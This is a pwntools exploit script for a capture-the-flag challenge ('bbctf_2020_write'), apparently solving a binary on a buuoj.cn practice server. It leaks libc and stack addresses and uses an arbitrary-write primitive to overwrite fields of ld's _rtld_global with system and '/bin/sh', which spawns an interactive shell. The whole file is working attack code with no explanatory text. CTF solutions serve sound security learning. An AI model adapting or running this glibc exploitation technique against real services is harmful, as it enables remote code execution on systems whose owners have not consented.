from pwn import *

#p = process('./bbctf_2020_write')
p = remote('node4.buuoj.cn', 26790)
libc = ELF('libc-2.27.buu.so')
ld = ELF('ld-2.27.so')

ru = lambda s : p.recvuntil(s)
sl = lambda s : p.sendline(s)
sn = lambda s : p.send(s)
rv = lambda s : p.recv(s)
sla = lambda r, s : p.sendlineafter(r, s)
sa = lambda r, s : p.sendafter(r, s)

def debug(s):
    gdb.attach(p, '''
        source ~/libc/loadsym.py
        loadsym ~/libc/2.27/64/libc-2.27.debug.so
    ''' + s)

def write(addr, val):
    sla(b'(q)uit', b'w')
    sla(b'ptr: ', str(addr).encode())
    sla(b'val: ', str(val).encode())

ru(b'puts: ')
libc_base = int(rv(14), 16) - libc.sym['puts']
ru(b'stack: ')
stack = int(rv(14), 16)

success('libc_base -> {}'.format(hex(libc_base)))
success('stack -> {}'.format(hex(stack)))

ld_base = libc_base + 0x3f1000
rtld_global = ld_base + ld.sym['_rtld_global']
system = libc_base + libc.sym['system']

bin_sh_num = u64(b'/bin/sh\x00')

write(rtld_global + 0xf00, system)
write(rtld_global + 0x908, bin_sh_num)

sla(b'(q)uit', b'q')

p.interactive()